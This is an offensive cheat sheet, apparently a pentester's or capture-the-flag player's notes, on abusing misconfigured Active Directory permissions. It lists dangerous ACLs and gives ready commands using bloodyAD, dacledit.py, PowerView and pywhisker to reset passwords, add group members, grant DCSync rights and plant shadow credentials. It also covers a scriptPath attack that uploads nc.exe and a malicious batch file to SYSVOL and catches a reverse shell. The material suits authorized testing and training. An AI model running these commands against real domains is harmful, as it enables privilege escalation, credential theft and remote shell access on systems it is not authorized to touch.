title: acl-attacks
html:
acl-attacks

> Abuse misconfigured AD permissions to escalate privileges. Check BloodHound for outbound object control.

Common Dangerous ACLs

| ACL | What it allows | |-----|---------------| | GenericAll | Full control — change password, modify group membership, set SPN, etc. | | GenericWrite | Write any attribute — scriptPath, msDS-KeyCredentialLink, SPN | | WriteDacl | Modify the object's ACL — grant yourself GenericAll | | WriteOwner | Change object owner — then grant yourself WriteDacl | | ForceChangePassword | Reset password without knowing current | | WriteProperty (specific) | Write specific attribute only (e.g., scriptPath, servicePrincipalName) |

Tools

bloodyAD

# Change password
bloodyAD --host DC -u user -p pass set password targetUser 'NewPass123!'

# Add group member
bloodyAD --host DC -u user -p pass add groupMember "Group Name" targetUser

# Set scriptPath
bloodyAD --host DC -u user -p pass set object "CN=Target,CN=Users,DC=domain,DC=htb" scriptPath -v script.bat

# Add SPN (for targeted Kerberoasting)
bloodyAD --host DC -u user -p pass set object "CN=Target,CN=Users,DC=domain,DC=htb" servicePrincipalName -v HTTP/evil.domain.htb

dacledit.py

# Read ACLs on a target
dacledit.py -action read -target 'targetUser' -principal 'attacker' 'domain/user:pass' -dc-ip DC_IP

# Grant DCSync rights
dacledit.py -action write -rights DCSync -principal 'attacker' -target-dn 'DC=domain,DC=htb' 'domain/user:pass' -dc-ip DC_IP

PowerView

# Read ACLs
Get-DomainObjectAcl -Identity targetUser -ResolveGUIDs | ? {$_.SecurityIdentifier -eq 'ATTACKER_SID'}

# Grant DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=htb" -PrincipalIdentity attacker -Rights DCSync

scriptPath Abuse (from Garfield)

When: WriteProperty on Script-Path for user objects.

# Upload nc.exe + malicious bat to SYSVOL
smbclient //DC/SYSVOL -U 'user%pass' -c 'cd domain.htb\scripts; put nc.exe; put evil.bat printerDetect.bat'

# Set target's logon script
bloodyAD --host DC -u user -p pass set object "CN=Target,CN=Users,DC=domain,DC=htb" scriptPath -v printerDetect.bat

# Catch shell when target logs in (simulated RDP)
nc -lvnp 9001

Shadow Credentials

When: GenericWrite on a user/computer (write msDS-KeyCredentialLink).

pywhisker -d domain.htb -u attacker -p pass --target victim --action add -dc-ip DC_IP
# Then use certipy or PKINITtools to get TGT from the generated certificate
